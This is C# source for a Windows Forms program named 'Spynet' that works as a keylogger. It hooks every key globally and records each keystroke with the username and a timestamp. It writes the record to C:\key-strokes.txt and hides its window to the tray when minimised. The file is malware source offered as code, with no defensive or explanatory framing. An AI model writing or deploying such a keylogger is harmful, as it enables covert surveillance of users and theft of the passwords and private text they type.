using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.ComponentModel.DataAnnotations;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Input;
using Utilities;

namespace Spynet
{
    public partial class Form1 : Form
    {
        private GlobalKeyboardHook gkh = new GlobalKeyboardHook();       

        public Form1()
        {
            InitializeComponent();
            InitializeKeys();
        }

        private void InitializeKeys()
        {            
            ///
            /// Add keys to log
            /// 
            foreach (Keys key in Enum.GetValues(typeof(Keys)))
            {
                gkh.HookedKeys.Add(key);
            }

            gkh.KeyDown += new KeyEventHandler(gkh_KeyDown);            
        }        

        private void gkh_KeyDown(object sender, KeyEventArgs e)
        {
            try
            {
                KeyValuePair<string, string> userStrokes =
                    new KeyValuePair<string, string>(Environment.UserName, e.KeyCode.ToString());

                StringBuilder toWrite = new StringBuilder();

                toWrite.Append(System.DateTime.Now.ToString("MM-dd-yyyy : hh.mm.ss - "));
                toWrite.Append(userStrokes.Key);
                toWrite.Append(" - ");

                if (IsKeyLocked(Keys.CapsLock))
                {
                    if (e.KeyCode == Keys.CapsLock)
                    {
                        toWrite.Append("CAPS OFF");
                    }
                    else
                    {
                        toWrite.Append(e.KeyCode.ToString());
                    }
                }
                else
                {
                    if (e.KeyCode == Keys.CapsLock)
                    {
                        toWrite.Append("CAPS ON");
                    }
                    else
                    {
                        toWrite.Append(e.KeyCode.ToString().ToLower());
                    }
                }        
              
                toWrite.Append("\r\n");

                lstLog.Items.Add(toWrite);
                
                File.AppendAllText(@"C:\key-strokes.txt", toWrite.ToString(), Encoding.UTF8);

                this.ScrollToBottom();
            }
            catch (Exception ex)
            {
                lstLog.Items.Add(ex.Message);
            }
        }

        private void Form1_Resize(object sender, System.EventArgs e)
        {
            if (WindowState == FormWindowState.Minimized)
            {
                this.Hide();
            }
        }

        private void ScrollToBottom()
        {
            int visibleItems = lstLog.ClientSize.Height / lstLog.ItemHeight;
            lstLog.TopIndex = Math.Max(lstLog.Items.Count - visibleItems + 1, 0);
        }

        private void notifyIcon_Spynet_Click(object sender, EventArgs e)
        {
            this.Show();
            this.WindowState = FormWindowState.Normal;
        }
    }
}
